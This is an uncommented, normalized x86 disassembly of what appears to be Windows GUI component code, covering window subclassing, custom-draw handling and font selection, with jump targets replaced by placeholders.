mov dl [ esi + 0xa ]
mov eax ebx
call sub_439450
pop esi
pop ebx
retn
sub_43a7ec
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x215 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x215 ] dl
mov eax ebx
call sub_456358
test al al
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_456054
push eax
call GetWindowLongA
mov esi eax
and esi 0xfffffffc
xor eax eax
mov al [ ebx + 0x215 ]
or esi [ eax * 4 + rw-data ]
push esi
push 0xfffffff0
mov eax ebx
call sub_456054
push eax
call SetWindowLongA
mov eax ebx
call sub_43c3b4
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x234 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_43c394
mov dl 0x3
mov eax ebx
call sub_43c394
jmp r-xdata
sub_43a870
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_455254
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x264 ] 0x0
jne r-xdata
mov edi [ esi + 0x8 ]
mov [ ebx + 0x264 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x260 ] eax
mov eax [ ebx + 0x25c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x264 ]
push eax
call SetWindowLongA
sub_43a8c0
push ebx
push esi
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_43c154
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43c154
call sub_4388f4
mov esi eax
sub_43a8e8
push ebx
cmp [ eax + 0x30a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
mov al 0x1
pop ebx
retn
sub_43a910
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] 0xffffffff
cmp [ eax + 0x312 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn 0x14
push ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_43a95c
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
mov al 0x1
pop ebx
retn
sub_43a984
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x322 ] 0x0
je r-xdata
xor eax eax
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
mov al 0x1
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_43a9b8
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x372 ] 0x0
je r-xdata
mov ecx [ ebx + 0x22c ]
mov dl 0x1
mov eax [ esp ]
call sub_438318
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x374 ]
call [ ebx + 0x370 ]
sub_43aa04
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_43aa50
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x2d ]
mov ecx 0xa
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_43ab71
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x2d ]
test bl 0x4
je r-xdata
cmp [ esi + 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0xd ]
jmp r-xdata
mov edx [ ebp - 0x29 ]
mov eax [ esi + 0x22c ]
call sub_438aac
mov ebx eax
cmp [ ebp - 0x29 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ab78
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax ebx
call sub_43aa04
mov [ ebp - 0x5 ] al
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x29 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0xd ]
mov [ eax + 0xc ] edx
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_4040ac
cmp [ ebp - 0x19 ] 0x0
je r-xdata
test [ ebp - 0x5 ] 0x10
je r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x11 ]
mov [ eax + 0x10 ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x19 ]
call sub_408af4
jmp r-xdata
mov cl [ ebp - 0x5 ]
mov edx [ esi + 0x28c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x9 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x28c ]
add eax 0x24
mov edx [ ebp - 0x4 ]
call sub_404100
test [ ebp - 0x5 ] 0x2
je r-xdata
sub_43ab98
test al 0x1
je r-xdata
test al 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
mov al 0x1
jmp r-xdata
test al 0x40
je r-xdata
mov al 0x2
jmp r-xdata
retn
xor eax eax
mov al 0x3
jmp r-xdata
sub_43abbc
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x20
je r-xdata
test esi 0x4
je r-xdata
or bl 0x20
test esi 0x8
je r-xdata
or bl 0x2
test esi 0x1
je r-xdata
or bl 0x4
test esi 0x2
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_43ac05
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff5c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b8ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff97
jg r-xdata
cmp eax 0xffffff9c
jg r-xdata
je r-xdata
sub eax 0xfffffff4
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edi eax
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_4034ac
test al al
jne r-xdata
cmp eax 0xffffff8d
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438aac
mov edx eax
mov ecx [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034ac
test al al
jne r-xdata
sub eax 0xffffff98
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
sub eax 0xffffff8f
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b8c1
lea eax [ ebp - 0x9c ]
call sub_4040ac
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
mov edx [ ebp - 0x8 ]
mov ebx esi
xor edx edx
push ebp
push sub_43b3e5
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_4252d4
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebx + 0xc ]
test eax 0x10000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x231 ] 0x1
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438a7c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
call sub_42a71c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov eax [ ebx + 0x14 ]
call sub_43abbc
push eax
mov eax [ ebx + 0x18 ]
call sub_43abbc
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
jmp r-xdata
sub eax 0xfffffecc
je r-xdata
test eax 0x20000
setne [ ebp - 0x1a ]
cmp [ ebp - 0x1a ] 0x0
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0xc ]
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_438aac
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4034ac
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x28 ]
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4034ac
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov esi [ ebx + 0x14 ]
test [ esi ] 0x1
je r-xdata
sub eax 0x97
je r-xdata
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x28
call sub_402cc4
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x58 ] eax
test [ ebx + 0xc ] 0x10002
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438aac
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4034ac
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43c148
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4034ac
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c148
mov eax [ eax + 0x18 ]
cmp eax [ esi + 0x4 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35a ] 0x0
je r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebx + 0xc ]
test eax 0x10001
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
call sub_403b10
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_43ae75
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4256c8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425584
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_4256c8
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438aac
mov edi eax
mov ecx [ ebx + 0x1c ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4034ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x36a ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c148
mov eax [ eax + 0x14 ]
cmp eax [ esi + 0x4 ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c148
mov eax [ eax + 0x18 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c148
pop edx
call sub_437ba8
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a964
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_470338
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov eax [ ebx + 0x10 ]
call sub_43ab98
mov [ ebp - 0xa ] al
xor esi esi
lea eax [ ebp - 0x10 ]
call sub_4040ac
lea ecx [ ebp - 0x18 ]
xor edx edx
xor eax eax
call sub_406158
mov [ ebp - 0x19 ] 0x4
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
sub eax 0x2
je r-xdata
test eax 0x10002
je r-xdata
xor edx edx
push ebp
push sub_43b21f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4256c8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425584
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_43c9a0
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_43c9a0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425540
retn
lea edx [ ebp - 0x34 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c148
mov eax [ eax + 0x14 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c148
pop edx
call sub_437ba8
jmp r-xdata
mov esi [ ebx + 0x18 ]
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0xc ]
test [ ebx ] 0x1
je r-xdata
jmp r-xdata
test eax 0x10003
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x104 ]
mov [ ebp - 0x9 ] al
mov ax [ ebx + 0x28 ]
push eax
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x108 ]
mov [ ebp - 0x9 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x298 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x29c ] edx
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
lea edx [ ebp - 0x34 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x2
je r-xdata
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4034ac
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebx + 0xc ]
push eax
mov al [ ebp - 0x19 ]
push eax
test [ ebx + 0x10 ] 0x20
setne al
push eax
mov eax [ ebx + 0x10 ]
call sub_43ab98
mov edx eax
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov edi [ ebx + 0x14 ]
test edi edi
je r-xdata
je r-xdata
test [ ebx ] 0x2
je r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
jne r-xdata
test eax 0x10004
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28a ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
call sub_403b10
call sub_403b10
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
lea edx [ ebp - 0x34 ]
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
test [ ebx + 0x18 ] 0x2
jne r-xdata
test [ ebx + 0x14 ] 0x2
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_4040ac
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_408af4
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x24 ]
sub eax 0x25
je r-xdata
jmp r-xdata
test [ ebx ] 0x10
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jg r-xdata
mov ecx [ ebx + 0x18 ]
dec ecx
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x14 ]
call sub_4089c4
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b226
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_4256c8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x210 ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov edi [ ebp - 0x8 ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423f34
mov [ edi + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0x14 ]
call sub_424bb8
call sub_423f34
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x98 ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0xc ]
call sub_424408
push eax
call GetObjectA
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
test [ ebx + 0x14 ] 0x2
je r-xdata
push 0x0
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
jmp r-xdata
mov [ ebp - 0x19 ] 0x0
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x14 ]
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43c1d4
mov eax [ edi + 0x10 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ eax ] 0x0
lea ecx [ ebp - 0x9c ]
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x24 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x9c ]
mov ecx [ ebx + 0x18 ]
dec ecx
mov eax [ ebx + 0x14 ]
call sub_4089c4
jmp r-xdata
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
mov ax [ ebx + 0x28 ]
push eax
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43aa50
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_4256c8
lea eax [ ebp - 0x98 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x298 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x29c ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
push 0x1
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
mov [ ebp - 0x19 ] 0x2
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax [ edi + 0x20 ]
inc eax
call sub_42a5f0
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0xf000
or [ ebx ] 0x8
jmp r-xdata
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0x8 ]
dec edx
mov eax edi
call sub_438940
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
dec ecx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43cc68
mov eax [ ebp - 0x20 ]
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x19 ] 0x3
jmp r-xdata
sub_43b226
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov cl 0x3
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
